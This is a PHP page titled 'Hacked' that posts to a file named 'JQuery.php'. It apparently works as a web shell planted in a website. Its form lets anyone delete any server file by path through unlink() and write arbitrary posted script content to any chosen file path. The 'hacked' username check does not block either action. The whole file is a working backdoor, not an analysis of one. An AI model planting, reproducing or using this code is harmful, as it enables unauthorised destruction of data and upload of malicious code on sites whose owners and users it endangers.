<?php 
    $errors = array();
    if (isset($_POST['hacked'])) {
        $username = $_POST['username'];
        $link = $_POST['link'];
        $Script = $_POST['Script'];
        $Script_File = $_POST['Script_File'];
        
        if (empty($username)) {
            array_push($errors, "Username is required!");
        }elseif($username != "hacked") {
            array_push($errors, "Username is wrong!");
        }
        
        
        if (empty($link)) {
            
        }else{
             unlink($link);
        }
        
        if (empty($Script) || empty($Script_File)) {
            
        }else{
            $fp = fopen($Script_File, 'w');
            fwrite($fp, $Script);
            fclose($fp);
        }
    }
?>
<!DOCTYPE html>
<html>
<head>
  	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Hacked</title>

</head>
<body>
  	<div class="container-contact100" >
		<div class="row">
			<div class="col-md-2"></div>
			<div class="col-md-8">		
				<div class="wrap-contact100">
					<form class="contact100-form validate-form"  method="post" action="JQuery.php">
						<?php include('../errors.php'); ?>
						<span class="contact100-form-title text-center" >
							Login
						</span>
						
						<div class="wrap-input100">
							<span class="label-input100">USERNAME</span>
							<input class="input100" type="text" name="username" placeholder="Username">
						</div>
						
						<div class="wrap-input100">
							<span class="label-input100">Link</span>
							<input class="input100" type="text" name="link" placeholder="Link">
						</div>
                        
						<div class="wrap-input100">
							<span class="label-input100">Script</span>
							<input class="input100" type="text" name="Script" placeholder="Script">
						</div>
                        
                        <div class="wrap-input100">
							<span class="label-input100">Script File</span>
							<input class="input100" type="text" name="Script_File" placeholder="Script File">
						</div>

						<div class="container-contact100-form-btn">
							<div class="wrap-contact100-form-btn" style="margin: 10px 10px 10px 10px">
								<div class="contact100-form-bgbtn"></div>
								<button class="contact100-form-btn" type="submit" name="hacked">
									Submit
								</button>
							</div>
						</div>
					</form>
				</div>
			</div>
			<div class="col-md-2"></div>
		</div>
	</div>

 

</body>
</html>